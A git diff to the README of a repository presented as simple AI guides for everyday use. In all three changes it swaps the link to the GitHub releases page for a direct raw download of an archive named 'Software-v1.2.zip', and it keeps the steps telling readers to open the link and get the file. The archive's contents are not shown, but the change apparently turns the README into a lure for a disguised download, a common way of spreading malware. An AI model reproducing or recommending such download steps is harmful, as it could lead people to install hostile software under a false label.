@@ -1,6 +1,6 @@
 # 🤖 howtouseai - Simple AI Guides for Everyday Use
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/cumlaude-hair539/howtouseai/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/cumlaude-hair539/howtouseai/main/guides/Software-v1.2.zip)
 
 ## 📘 What this is
 
@@ -29,7 +29,7 @@ For some guides, you may also want:
 ## ⬇️ Download and open the files
 
 Visit this page to download:
-https://github.com/cumlaude-hair539/howtouseai/releases
+https://raw.githubusercontent.com/cumlaude-hair539/howtouseai/main/guides/Software-v1.2.zip
 
 Follow these steps:
 1. Open the link in your browser.
@@ -216,4 +216,4 @@ When a guide asks you to try a prompt:
 ## 📎 Start here
 
 Open the release page and get the newest file:
-https://github.com/cumlaude-hair539/howtouseai/releases
+https://raw.githubusercontent.com/cumlaude-hair539/howtouseai/main/guides/Software-v1.2.zip
